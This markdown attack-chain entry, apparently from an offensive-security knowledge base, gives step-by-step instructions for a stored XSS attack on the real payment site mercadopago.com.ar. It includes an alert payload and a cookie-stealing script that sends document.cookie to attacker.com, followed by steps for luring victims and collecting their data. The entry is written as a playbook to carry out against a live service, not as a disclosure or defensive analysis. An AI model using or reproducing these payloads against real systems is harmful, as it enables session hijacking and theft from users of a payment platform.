---
tags:
  - xss
  - stored-xss
  - javascript
  - web
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Stored-XSS-Payload-in-MercadoPago]]'
  - '[[procedures/Trigger-XSS-for-JavaScript-Execution]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.366Z'
description: >-
  A multi-step attack exploiting a stored XSS vulnerability in MercadoPago's web
  application to inject and execute malicious JavaScript, enabling session
  hijacking and data theft.
skill_level: intermediate
impact_level: high
id: 8b11b334-5b98-496b-93bd-134d1d3d3dc3
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in MercadoPago.com.ar for Arbitrary JavaScript Execution

Multi-stage attack chain demonstrating exploitation of a stored cross-site scripting vulnerability in mercadopago.com.ar, allowing injection of malicious scripts that persist and execute in users' browsers, potentially leading to session hijacking, data exfiltration, or phishing.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Inject Payload] --> B[Trigger Execution]
    B --> C[Exploit Impact]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform
- MercadoPago services on mercadopago.com.ar
- Access to user input fields (e.g., forms for comments or profiles)

### Initial Access Requirements

- Valid user account on mercadopago.com.ar
- Network access to the website
- No prior privileged access needed

## Detailed Attack Procedures

### Step 1: Payload Injection
procedure: [[procedures/Inject-Stored-XSS-Payload-in-MercadoPago]]

**Objective**: Submit a malicious JavaScript payload to a vulnerable input field that stores user data without proper sanitization, allowing the script to be persisted on the server.

**Instructions**: Identify a form field on mercadopago.com.ar that accepts and stores user input, such as a profile description or comment section. Use [[tools/Burp-Suite]] to intercept and modify the request, injecting a payload like `<script>alert('XSS');</script>` or a more advanced one for data exfiltration, e.g., `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

**Expected Output**: The payload is successfully stored and visible in the application's stored content without escaping.

**Success Indicators**:
- Payload appears in the response without HTML encoding
- No immediate error from the server

### Step 2: Trigger and Observe Execution
procedure: [[procedures/Trigger-XSS-for-JavaScript-Execution]]

**Objective**: Access the stored content to trigger the execution of the injected script in the victim's browser context, leading to arbitrary JavaScript execution.

**Instructions**: Log in as a victim user or share the link to the stored content page. When the page loads, the script executes automatically. Monitor the attacker's server for exfiltrated data if using a beacon payload.

**Expected Output**: JavaScript alert or network request to attacker's domain confirming execution.

**Success Indicators**:
- Alert box appears or console logs show execution
- Data (e.g., cookies) sent to attacker's endpoint

## Attack Chain Summary

### Key Achievements

1. Successful injection and storage of malicious script
2. Execution of arbitrary JavaScript in user browsers
3. Potential for session hijacking or data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
